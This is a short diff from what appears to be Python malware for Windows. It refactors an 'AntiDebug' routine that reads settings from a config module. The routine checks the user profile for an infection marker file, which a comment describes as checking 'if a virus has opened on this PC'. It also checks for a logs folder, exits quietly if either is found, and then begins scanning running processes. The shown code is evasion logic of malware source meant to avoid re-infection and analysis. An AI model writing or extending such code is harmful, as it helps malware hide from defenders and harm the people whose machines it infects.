@@ -21,6 +21,7 @@ from requests import get
 from platform import system
 from json import loads
 from manager.blacklist import BlackList
+from preferences.config import config
 
 
 
@@ -139,14 +140,14 @@ def checkPlatform():
 
 
 
-def AntiDebug(oneStart):
-    pathf =  environ['USERPROFILE'] +  sep + r'AppData\Local'
+def AntiDebug():
+    user =  environ['USERPROFILE']
     
-    if oneStart:
-        if (exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):# Checks if a virus has opened on this PC
+    if config.oneStart:
+        if (exists(f'{user}\\AppData\\Local\\Microsoft\\Windows\\{str(config.id)}')):# Checks if a virus has opened on this PC
              _exit(0)
 
-    if  exists(rf'{pathf}\windll'):
+    if  exists(f'{user}\\{config.pathToLogs}'):
          _exit(0)
 
     processlist = process_iter(['name'])
